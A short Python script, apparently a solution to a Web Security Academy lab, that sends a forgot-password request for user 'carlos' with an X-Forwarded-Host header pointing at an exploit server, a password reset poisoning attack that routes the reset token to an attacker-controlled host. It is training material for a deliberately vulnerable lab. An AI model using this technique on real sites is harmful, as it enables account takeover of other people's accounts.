import requests


lab_url = 'https://0af8004d032ae0f8802d033a0042001f.web-security-academy.net/forgot-password'
exploit_url = 'exploit-0a9d0030036fe034805a022c016f003e.exploit-server.net/exploit'

headers = {'X-Forwarded-Host': exploit_url}

data = {'username': 'carlos'}

response = requests.post(url=lab_url, data=data, headers=headers)

print(response.text)